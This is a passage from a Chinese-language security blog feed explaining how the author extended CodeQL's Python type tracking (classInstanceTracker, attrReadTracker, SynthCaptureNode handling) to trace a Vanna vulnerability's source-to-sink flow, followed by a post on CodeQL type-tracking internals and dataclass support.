class="params">(Node start, Class cls)</span> &#123;</span><br><span class="line">    resolveClassCall(start.(CallCfgNode).asCfgNode(), cls)</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// result of `super().__new__` as used in a `__new__` method implementation</span></span><br><span class="line">    exists(Class classUsedInSuper |</span><br><span class="line">      fromSuperNewCall(start.(CallCfgNode).asCfgNode(), classUsedInSuper, _, _) <span class="type">and</span></span><br><span class="line">      <span class="variable">classUsedInSuper</span> <span class="operator">=</span> getADirectSuperclass*(cls)</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// patched by m0d9, for such case</span></span><br><span class="line">    <span class="comment">// ```python</span></span><br><span class="line">    <span class="comment">// def foo(bar: cls):</span></span><br><span class="line">    <span class="comment">// ```</span></span><br><span class="line">    <span class="comment">// bar could be a start node</span></span><br><span class="line">    or</span><br><span class="line">    <span class="title function_">exists</span><span class="params">(Function f,Parameter p, <span class="type">int</span> i|</span></span><br><span class="line"><span class="params">      f.getArg(i)</span> = p</span><br><span class="line">      and p.getAnnotation().(Name).toString() = cls.getName()</span><br><span class="line">      |</span><br><span class="line">      start.asExpr() = p</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>测试增强之后的classInstanceTracker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">test_class_instance_track</span><span class="params">(Class c, Node n)</span>&#123;</span><br><span class="line">    n = classInstanceTracker(c)</span><br><span class="line">    and c.getName() = <span class="string">&quot;VannaBase&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-938.png" alt="upload successful"></p><p>可以看到，classInstanceTracker(VannaBase) 是能够传播至参数vn的</p><p>再来试试directCall_join 中的逻辑<br>1.before</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">test_attr_access</span><span class="params">(AttrRead attr, Node self, string functionName)</span>&#123;</span><br><span class="line">    attr.accesses(self, functionName) </span><br><span class="line">    <span class="type">and</span> <span class="variable">functionName</span> <span class="operator">=</span> <span class="string">&quot;generate_plotly_code&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-939.png" alt="upload successful"><br>2.添加classInstanceTracker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">test_attr_access2</span><span class="params">(AttrRead attr, Node self, string functionName, Class cls)</span>&#123;</span><br><span class="line">    attr.accesses(self, functionName) </span><br><span class="line">    <span class="type">and</span> <span class="variable">functionName</span> <span class="operator">=</span> <span class="string">&quot;generate_plotly_code&quot;</span></span><br><span class="line">    and self in [classTracker(cls), classInstanceTracker(cls)]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为空，不行<br>3.对比classInstanceTracker 结果</p><p><img src="/images/pasted-940.png" alt="upload successful"></p><h4 id="引入新问题：SynthCaptureNode-VS-ControlFlowNode"><a href="#引入新问题：SynthCaptureNode-VS-ControlFlowNode" class="headerlink" title="引入新问题：SynthCaptureNode VS ControlFlowNode"></a>引入新问题：SynthCaptureNode VS ControlFlowNode</h4><p>针对<code>self in [classTracker(cls), classInstanceTracker(cls)]</code>，getAQlClass 对比发现差异原因</p><p><img src="/images/pasted-941.png" alt="upload successful"></p><h4 id="SynthCaptureNode-amp-amp-CapturedVariable-amp-amp-LocalVariable-amp-amp-ExprNode"><a href="#SynthCaptureNode-amp-amp-CapturedVariable-amp-amp-LocalVariable-amp-amp-ExprNode" class="headerlink" title="SynthCaptureNode &amp;&amp; CapturedVariable &amp;&amp; LocalVariable &amp;&amp; ExprNode"></a>SynthCaptureNode &amp;&amp; CapturedVariable &amp;&amp; LocalVariable &amp;&amp; ExprNode</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SynthCaptureNode</span><br><span class="line">    TSynthCaptureNode</span><br><span class="line">    Node</span><br><span class="line">        TNode</span><br><span class="line">            ControlFlowNode</span><br><span class="line">                <span class="meta">@py_flow_node</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// semmle.python.dataflow.new.internal.DataFlowPrivate.qll</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A synthesized data flow node representing a closure object that tracks</span></span><br><span class="line"><span class="comment"> * captured variables.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SynthCaptureNode</span> <span class="keyword">extends</span> <span class="title class_">Node</span>, TSynthCaptureNode &#123;</span><br><span class="line">  <span class="keyword">private</span> VariableCapture::Flow::SynthesizedCaptureNode cn;</span><br><span class="line"></span><br><span class="line"><span class="comment">// shared.dataflow.codeql.dataflow.VariableCapture.qll</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SynthesizedCaptureNode</span> <span class="keyword">extends</span> <span class="title class_">ClosureNode</span>, TSynthesizedCaptureNode &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">TSynthesizedCaptureNode</span> = TSynthRead or TSynthThisQualifier or TSynthPhi;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClosureNode</span> <span class="keyword">extends</span> <span class="title class_">TClosureNode</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">newtype</span> <span class="variable">TClosureNode</span> <span class="operator">=</span></span><br><span class="line">    TSynthRead(CapturedVariable v, BasicBlock bb, <span class="type">int</span> i, Boolean isPost) &#123;</span><br><span class="line">      synthRead(v, bb, i, _, _)</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// semmle.python.dataflow.new.internal.VariableCapture.qll</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CapturedVariable</span> <span class="keyword">extends</span> <span class="title class_">LocalVariable</span> &#123;</span><br><span class="line">    Function f;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ExprNode</span><br><span class="line">    CfgNode</span><br><span class="line">        TCfgNode</span><br><span class="line">        Node</span><br><span class="line">            TNode</span><br><span class="line">            ControlFlowNode</span><br><span class="line">                <span class="meta">@py_flow_node</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CapturedVariable</span><br><span class="line">    LocalVariable</span><br><span class="line">        Variable</span><br><span class="line">            <span class="meta">@py_variable</span></span><br></pre></td></tr></table></figure><h4 id="从SynthCaptureNode-到-ExprNode"><a href="#从SynthCaptureNode-到-ExprNode" class="headerlink" title="从SynthCaptureNode 到 ExprNode"></a>从SynthCaptureNode 到 ExprNode</h4><ol><li>SynthCaptureNode  到 CapturedVariable<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from SynthCaptureNode n, CapturedVariable v</span><br><span class="line">where </span><br><span class="line">    n.getSynthesizedCaptureNode().isVariableAccess(v)</span><br></pre></td></tr></table></figure></li><li>CapturedVariable 到 LocalVariable</li><li>LocalVariable 到ExprNode</li></ol><p><img src="/images/pasted-942.png" alt="upload successful"></p><ul><li>attr 为SynthCaptureNode</li><li>v 为LocalVariable</li></ul><h3 id="4-3-问题二定位：attrReadTracker"><a href="#4-3-问题二定位：attrReadTracker" class="headerlink" title="4.3 问题二定位：attrReadTracker"></a>4.3 问题二定位：attrReadTracker</h3><h4 id="attrReadTracker"><a href="#attrReadTracker" class="headerlink" title="attrReadTracker"></a>attrReadTracker</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Gets a reference to the attribute read `attr` */</span></span><br><span class="line">Node <span class="title function_">attrReadTracker</span><span class="params">(AttrRead attr)</span> &#123;</span><br><span class="line">  CallGraphConstruction::Simple::Make&lt;TrackAttrReadInput&gt;::track(attr)</span><br><span class="line">      .(LocalSourceNode)</span><br><span class="line">      .flowsTo(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> test_TrackAttrReadInput <span class="keyword">implements</span> <span class="title class_">CallGraphConstruction</span>::Simple::InputSig &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span> = AttrRead;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">start</span><span class="params">(Node start, AttrRead attr)</span> &#123;</span><br><span class="line">    start = attr and</span><br><span class="line">    <span class="comment">// pragma[only_bind_into](attr.getObject()) in [</span></span><br><span class="line">    <span class="comment">//     classTracker(_), classInstanceTracker(_), selfTracker(_), clsArgumentTracker(_),</span></span><br><span class="line">    <span class="comment">//     superCallNoArgumentTracker(_), superCallTwoArgumentTracker(_, _)</span></span><br><span class="line">    <span class="comment">//   ]</span></span><br><span class="line">    <span class="comment">// and </span></span><br><span class="line">    attr.accesses(_, <span class="string">&quot;generate_plotly_code&quot;</span>)</span><br><span class="line">    and attr.getLocation().getFile().getAbsolutePath().matches(<span class="string">&quot;%flask/__init__.py%&quot;</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-944.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma[nomagic]</span><br><span class="line"><span class="keyword">private</span> predicate <span class="title function_">test_directCall_join</span><span class="params">(</span></span><br><span class="line"><span class="params">  CallNode call, string functionName, Class cls, AttrRead attr, Node self</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">  (call.getFunction() = attrReadTracker(attr).asCfgNode() </span><br><span class="line">    or call.getFunction() = attr.asCfgNode()</span><br><span class="line">  ) and</span><br><span class="line">  attr.accesses(self, functionName) and</span><br><span class="line">  <span class="comment">// self in [classTracker(cls), classInstanceTracker(cls)]</span></span><br><span class="line">  exists(Node clsis|</span><br><span class="line">    clsis = [classTracker(cls), classInstanceTracker(cls)]</span><br><span class="line">    |</span><br><span class="line">    self = clsis</span><br><span class="line">    <span class="comment">// local variable</span></span><br><span class="line">    or <span class="title function_">exists</span><span class="params">(LocalVariable v|</span></span><br><span class="line"><span class="params">      clsis.(SynthCaptureNode)</span>.getSynthesizedCaptureNode().isVariableAccess(v)</span><br><span class="line">      and self.asCfgNode().getNode().toString() = v.getId()</span><br><span class="line">      and self.asCfgNode().getScope() = v.getAnAccess().getScope()</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-945.png" alt="upload successful"></p><p>是否有更优雅解？</p><h3 id="4-4-更优解：variableCaptureLocalFlowStep？"><a href="#4-4-更优解：variableCaptureLocalFlowStep？" class="headerlink" title="4.4 更优解：variableCaptureLocalFlowStep？"></a>4.4 更优解：variableCaptureLocalFlowStep？</h3><h5 id="flowsTo"><a href="#flowsTo" class="headerlink" title="flowsTo"></a>flowsTo</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LocalSources::flowsTo</span><br><span class="line">    LocalSources::Cached::hasLocalSource</span><br><span class="line">        LocalSources::Cached::localSourceFlowStep</span><br><span class="line">            DataFlowPrivate::simpleLocalFlowStep</span><br><span class="line">                simpleLocalFlowStepForTypetracking</span><br><span class="line">                summaryLocalStep</span><br><span class="line">                variableCaptureLocalFlowStep</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-946.png" alt="upload successful"><br>结果</p><p><img src="/images/pasted-947.png" alt="upload successful"></p><h2 id="5-其他问题"><a href="#5-其他问题" class="headerlink" title="5. 其他问题"></a>5. 其他问题</h2><h3 id="5-1-abstractmethod-抽象方法识别"><a href="#5-1-abstractmethod-抽象方法识别" class="headerlink" title="5.1 abstractmethod 抽象方法识别"></a>5.1 abstractmethod 抽象方法识别</h3><blockquote><p>Python 中的 abstractmethod 是在 abc 模块中引入的，该模块在Python 2.6 版本中引入，并随着Python 3 的发展而不断完善 <a href="https://blog.csdn.net/weixin_40907382/article/details/80277170">https://blog.csdn.net/weixin_40907382/article/details/80277170</a> 。abc 模块提供了抽象基类(Abstract Base Classes, ABC) 的支持，使得开发者能够定义具有抽象方法的类，从而实现更严格的面向对象设计。<br>简单来说，abstractmethod 是 abc 模块的一部分，用于标记抽象方法，这些方法必须在子类中被实现。它确保了子类必须提供特定功能的实现，提高了代码的可维护性和可扩展性。</p></blockquote><p><img src="/images/pasted-948.png" alt="upload successful"></p><p>结论：当前CodeQL版本(v2.17.2) 支持</p><h3 id="5-2-dataclass-数据类"><a href="#5-2-dataclass-数据类" class="headerlink" title="5.2 dataclass 数据类"></a>5.2 dataclass 数据类</h3><blockquote><p><a href="https://docs.python.org/zh-cn/3.13/library/dataclasses.html">https://docs.python.org/zh-cn/3.13/library/dataclasses.html</a><br>Python的dataclass在Python 3.7版本中被引入。它是通过dataclasses模块实现的，并且使用<code>@dataclass</code>装饰器来简化数据类的创建。<br>更详细的解释:<br>Python 3.7:<br>dataclass是作为Python标准库的一部分，在Python 3.7版本中引入的。<br>@dataclass:<br>这个装饰器可以自动生成一些特殊方法，例如<code>__init__()，__repr__()，__eq__()</code>等，这些方法通常是数据类所需要的。 </p></blockquote><p><img src="/images/pasted-949.png" alt="upload successful"></p><p>结论：当前CodeQL版本(v2.17.2) 不支持</p><p>初步思路：</p><ol><li>需适配模拟<strong>init</strong>() 方法</li><li>需适配模拟field 的访问</li><li>需适配模拟<strong>str</strong></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-漏洞原理&quot;&gt;&lt;a href=&quot;#1-漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞原理&quot;&gt;&lt;/a&gt;1. 漏洞原理&lt;/h2&gt;&lt;p&gt;漏洞并不复杂，整个链也不长&lt;/p&gt;
&lt;p&gt;source：&lt;br&gt;&lt;a href=&quot;https://github.com/vanna-ai/vanna/blob/a72b842d420cf1fa061e5f97d45ea08051651ebb/src/vanna/flask/__init__.py#L441&quot;&gt;https://github.com/vanna-ai/vanna/blob/a72b842d420cf1fa061e5f97d45ea08051651ebb/src/vanna/flask/__init__.py#L441&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-925.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;sink：&lt;br&gt;&lt;a href=&quot;https://github.com/vanna-ai/vanna/blob/4da8dea0ce14a0d1db5a0692a7921d873be91c5f/src/vanna/base/base.py#L2088&quot;&gt;https://github.com/vanna-ai/vanna/blob/4da8dea0ce14a0d1db5a0692a7921d873be91c5f/src/vanna/base/base.py#L2088&lt;/a&gt; &lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="http://m0d9.me/categories/CodeQL/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL Python 类型追踪</title>
    <link href="http://m0d9.me/2025/06/10/CodeQL-%E7%B1%BB%E5%9E%8B%E8%BF%BD%E8%B8%AA/"/>
    <id>http://m0d9.me/2025/06/10/CodeQL-%E7%B1%BB%E5%9E%8B%E8%BF%BD%E8%B8%AA/</id>
    <published>2025-06-10T12:56:00.000Z</published>
    <updated>2025-06-13T10:20:34.775Z</updated>
    
    <content type="html"><![CDATA[<p>在分析CodeQL Python 污点分析时候发现，有用到shared 的新模块typetracking。从前面Python 的Extractor 分析中，我们知道它的DB 内是没有类型信息的，没有类型信息是怎么做污点呢？</p><p>Java 是在编译的时候创建的DB，这一过程中可以拿到了AST 节点对应的类型信息，例如call 节点函数信息，可以直接关联callable，知道调的是哪个函数。但是纯AST 要怎么做？</p><p>联想之前做Java 反射Patch 的时候，印象中也需要用到类型跟踪,但是是自己实现的，改动颇大，不知道这个typetracking 是否能够更优雅的解决，分析下。</p><p><img src="/images/pasted-923.png" alt="upload successful"></p><span id="more"></span><h2 id="1-抽象模块"><a href="#1-抽象模块" class="headerlink" title="1. 抽象模块"></a>1. 抽象模块</h2><p>在shared/typetracking/internal/TypeTracking.qll 中，定义了抽象模块</p><ul><li>CallGraphConstruction::Simple::InputSig</li><li>CallGraphConstruction::Simple::Make<InputSig></li></ul><h3 id="InputSig"><a href="#InputSig" class="headerlink" title="InputSig"></a>InputSig</h3><p>InputSig 可以简单理解为dataflow 中的Config，它是一个<code>signature module</code>，类似接口类的概念。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** The input to call graph construction. */</span></span><br><span class="line">signature <span class="keyword">module</span> InputSig &#123;</span><br><span class="line">  <span class="comment">/** A state to track during type tracking. */</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Holds if type tracking should start at `start` in state `state`. */</span></span><br><span class="line">  predicate <span class="title function_">start</span><span class="params">(Node start, State state)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Holds if type tracking should stop at `n`. */</span></span><br><span class="line">  predicate <span class="title function_">filter</span><span class="params">(Node n)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其定义了两个接口</p><ul><li>start：起始节点，需要根据不同的场景，统一转换成Node 类型，比如：<ul><li>classInstance 类型的，class 为ClassInstance，需要</li></ul></li><li>filter：类似sanitizer，过滤方法</li></ul><h2 id="2-Python-内置Tracers"><a href="#2-Python-内置Tracers" class="headerlink" title="2. Python 内置Tracers"></a>2. Python 内置Tracers</h2><p>实际上，有很多内置Tracker，以Python 为例，其内置了以下实现</p><ul><li>classTracker</li><li>classInstanceTracker</li><li>selfTracker</li><li>clsArgumentTracker</li><li>superCallNoArgumentTracker</li><li>superCallTwoArgumentTracker</li></ul><h3 id="2-1-ClassTracer"><a href="#2-1-ClassTracer" class="headerlink" title="2.1 ClassTracer"></a>2.1 ClassTracer</h3><h4 id="2-1-1-TrackClassInput"><a href="#2-1-1-TrackClassInput" class="headerlink" title="2.1.1 TrackClassInput"></a>2.1.1 TrackClassInput</h4><h5 id="start"><a href="#start" class="headerlink" title="start"></a>start</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> TrackClassInput <span class="keyword">implements</span> <span class="title class_">CallGraphConstruction</span>::Simple::InputSig &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span> = Class;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">start</span><span class="params">(Node start, Class cls)</span> &#123;</span><br><span class="line">    start.asExpr() = cls.getParent()</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// when a class is decorated, it&#x27;s the result of the (last) decorator call that</span></span><br><span class="line">    <span class="comment">// is used</span></span><br><span class="line">    start.asExpr() = cls.getParent().getADecoratorCall()</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// `type(obj)`, where obj is an instance of this class</span></span><br><span class="line">    start = getTypeCall() and</span><br><span class="line">    start.(CallCfgNode).getArg(<span class="number">0</span>) = classInstanceTracker(cls)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释义：</p><ul><li>普通的类class，那么取其Expr 对应的Node 作为start  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class Foo:// 整个作为 start Expr</span><br></pre></td></tr></table></figure></li><li>当一个类class 存在修饰符的时候，那么选择其最后一个装饰器作为start  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@decorator2</span></span><br><span class="line"><span class="meta">@decorator1// decorator1 作为 start Expr</span></span><br><span class="line">Class Foo:</span><br></pre></td></tr></table></figure></li><li>如果有个表达式type(obj) ，其中obj 是class 类型的，那么整个<code>type(obj)</code> 作为start  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class Foo:</span><br><span class="line">...</span><br><span class="line">foo = Foo()</span><br><span class="line"><span class="built_in">type</span>(foo)// <span class="built_in">type</span>(foo) 作为start Expr</span><br></pre></td></tr></table></figure><blockquote><p>这里用到了classInstanceTracker，后面有详细解释</p></blockquote></li></ul><h5 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">filter</span><span class="params">(Node n)</span> &#123;</span><br><span class="line">  ignoreForCallGraph(n.getLocation().getFile())</span><br><span class="line">  or</span><br><span class="line">  n.(ParameterNodeImpl).isParameterOf(_, any(ParameterPosition pp | pp.isSelf()))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-2-Make-API"><a href="#2-1-2-Make-API" class="headerlink" title="2.1.2 Make API"></a>2.1.2 Make API</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Node <span class="title function_">classTracker</span><span class="params">(Class cls)</span> &#123;</span><br><span class="line">  CallGraphConstruction::Simple::Make&lt;TrackClassInput&gt;::track(cls).(LocalSourceNode).flowsTo(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释义：</p><h3 id="2-2-classInstanceTracker"><a href="#2-2-classInstanceTracker" class="headerlink" title="2.2 classInstanceTracker"></a>2.2 classInstanceTracker</h3><ul><li>以类实例化作为起点</li><li>跟踪寻找其传播可能</li></ul><h4 id="2-2-1-TrackClassInstanceInput"><a href="#2-2-1-TrackClassInstanceInput" class="headerlink" title="2.2.1 TrackClassInstanceInput"></a>2.2.1 TrackClassInstanceInput</h4><h5 id="start-1"><a href="#start-1" class="headerlink" title="start"></a>start</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> TrackClassInstanceInput <span class="keyword">implements</span> <span class="title class_">CallGraphConstruction</span>::Simple::InputSig &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span> = Class;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">start</span><span class="params">(Node start, Class cls)</span> &#123;</span><br><span class="line">    resolveClassCall(start.(CallCfgNode).asCfgNode(), cls)</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// result of `super().__new__` as used in a `__new__` method implementation</span></span><br><span class="line">    exists(Class classUsedInSuper |</span><br><span class="line">      fromSuperNewCall(start.(CallCfgNode).asCfgNode(), classUsedInSuper, _, _) <span class="type">and</span></span><br><span class="line">      <span class="variable">classUsedInSuper</span> <span class="operator">=</span> getADirectSuperclass*(cls)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释义：</p><ul><li>resolveClassCall  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">...</span><br><span class="line">bar = Foo()// Foo() 作为start</span><br></pre></td></tr></table></figure></li><li>getADirectSuperclass 是获取cls 的父类  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__new__</span>():</span><br><span class="line">  bar = <span class="built_in">super</span>().__new__(cls)// <span class="built_in">super</span>().__new__(cls) 作为start</span><br></pre></td></tr></table></figure></li></ul><h6 id="resolveClassCall"><a href="#resolveClassCall" class="headerlink" title="resolveClassCall"></a>resolveClassCall</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -------------------------------------</span></span><br><span class="line"><span class="comment">// class call resolution</span></span><br><span class="line"><span class="comment">// -------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Holds when `call` is a call to the class `cls`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> We have this predicate mostly to be able to compare with old point-to</span></span><br><span class="line"><span class="comment"> * call-graph resolution. So it could be removed in the future.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">predicate <span class="title function_">resolveClassCall</span><span class="params">(CallNode call, Class cls)</span> &#123;</span><br><span class="line">  call.getFunction() = classTracker(cls).asCfgNode()</span><br><span class="line">  or</span><br><span class="line">  <span class="comment">// `cls()` inside a classmethod (which also contains `type(self)()` inside a method)</span></span><br><span class="line">  exists(Class classWithMethod |</span><br><span class="line">    call.getFunction() = clsArgumentTracker(classWithMethod).asCfgNode() and</span><br><span class="line">    getADirectSuperclass*(cls) = classWithMethod</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>CallNode.getFunction 并不是字面上的意思，并不是找到call 对应的Function，而只是找到call，举例解释:<ul><li><p>CallNode: foo.bar(arg) </p></li><li><p>getFunction: foo.bar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** A control flow node corresponding to a call expression, such as `func(...)` */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CallNode</span> <span class="keyword">extends</span> <span class="title class_">ControlFlowNode</span> 